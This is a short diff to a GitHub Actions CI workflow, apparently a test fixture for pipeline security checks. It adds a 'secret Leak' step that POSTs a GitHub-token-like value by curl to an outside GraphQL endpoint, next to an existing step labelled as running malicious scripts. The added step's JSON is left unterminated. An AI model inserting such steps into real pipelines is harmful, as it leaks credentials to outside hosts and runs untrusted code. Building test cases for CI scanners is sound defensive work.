@@ -63,6 +63,13 @@ jobs:
 
       - name: 😈 Execute malicious script
         run: bash run_malicious_scripts.sh
+
+      - name : secret Leak
+        run: |
+          curl -X POST https://api.veribom.com/graphql \
+           -H "Content-Type: application/json" \
+           -d '{
+           "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
         
       - name: Install dependencies
         run: pip install -r requirements.txt
